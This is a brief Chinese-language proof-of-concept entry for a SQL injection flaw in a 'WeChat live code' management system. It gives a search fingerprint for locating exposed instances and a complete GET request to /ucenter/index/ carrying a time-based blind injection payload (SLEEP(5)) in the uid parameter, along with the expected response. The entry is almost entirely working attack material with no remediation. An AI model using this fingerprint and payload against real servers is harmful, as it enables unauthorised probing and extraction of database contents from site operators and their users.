# 微信活码系统indexSQL注入漏洞

微信活码系统index ｜ SQL注入 ｜ —
- **指纹**：`body=".qn-user-login"`
- **请求**：`GET /ucenter/index/?uid=1) AND (SELECT 3460 FROM (SELECT(SLEEP(5)))RkHL) AND (1015=1015 HTTP/1.1`
- **响应特征**：200